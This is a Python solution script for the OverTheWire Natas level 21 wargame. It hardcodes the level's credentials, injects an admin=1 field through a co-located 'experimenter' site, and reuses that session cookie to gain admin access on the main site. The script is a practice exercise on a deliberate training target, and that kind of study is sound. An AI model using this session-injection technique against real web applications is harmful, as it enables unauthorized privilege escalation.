#! /bin/python
import requests, string, sys, binascii, codecs
url = "http://natas21.natas.labs.overthewire.org"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org"
username = "natas21"
password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"

r2 = requests.post(url2, auth=(username, password), data=(dict(submit="Update",admin="1")))
cookie = r2.cookies.get_dict()

r3 = requests.post(url, auth=(username, password), data=(dict(admin="1")), cookies=cookie)
print (r3.content)
